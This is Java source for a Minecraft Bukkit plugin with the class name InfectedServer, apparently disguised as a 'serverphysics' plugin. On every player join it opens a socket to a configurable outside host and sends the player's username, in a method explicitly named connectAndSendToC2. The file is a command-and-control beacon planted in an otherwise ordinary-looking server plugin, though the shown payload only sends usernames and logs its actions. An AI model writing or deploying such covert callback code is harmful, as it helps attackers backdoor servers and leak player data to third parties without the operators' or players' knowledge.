package com.example.wizard;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;

public class InfectedServer extends JavaPlugin {

    private String targetIp;
    private int targetPort;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        targetIp = getConfig().getString("target-ip", "127.0.0.1");
        targetPort = getConfig().getInt("target-port", 5002);
        getServer().getPluginManager().registerEvents(new PlayerListener(), this);
        getLogger().info("Listening for player joins. Forwarding to " + targetIp + ":" + targetPort);
    }

    @Override
    public void onDisable() {
        getLogger().info("serverphysics disabled.");
    }

    private class PlayerListener implements Listener {
        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent event) {
            String playerName = event.getPlayer().getName();
            getLogger().info("Player joined: " + playerName);
            new Thread(() -> connectAndSendToC2(playerName)).start();
        }
    }

    private void connectAndSendToC2(String username) {
        try {
            getLogger().info("Connecting to " + targetIp + ":" + targetPort);
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(InetAddress.getByName(targetIp), targetPort), 5000);

            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            out.println("PLAYER_CONNECTED:" + username);
            out.flush();
            getLogger().info("Sent player info for: " + username);

            socket.close();
        } catch (Exception e) {
            getLogger().warning("Failed to connect to " + targetIp + ":" + targetPort + " - " + e.getMessage());
        }
    }
}
